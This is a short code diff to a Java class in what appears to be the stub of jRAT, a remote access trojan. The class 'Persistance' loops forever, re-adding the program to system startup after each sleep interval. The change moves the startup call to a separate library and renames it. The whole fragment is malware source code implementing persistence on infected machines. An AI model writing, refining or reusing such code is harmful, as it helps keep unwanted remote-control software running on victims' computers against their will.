@@ -1,5 +1,7 @@
 package se.jrat.stub;
 
+import startuplib.Startup;
+
 public class Persistance extends Thread {
 
 	private int ms;
@@ -12,7 +14,7 @@ public class Persistance extends Thread {
 	public void run() {
 		while (true) {
 			try {
-				Startup.addToStartup(Configuration.name);
+				Startup.add(Configuration.name);
 
 				Thread.sleep(ms);
 			} catch (Exception ex) {
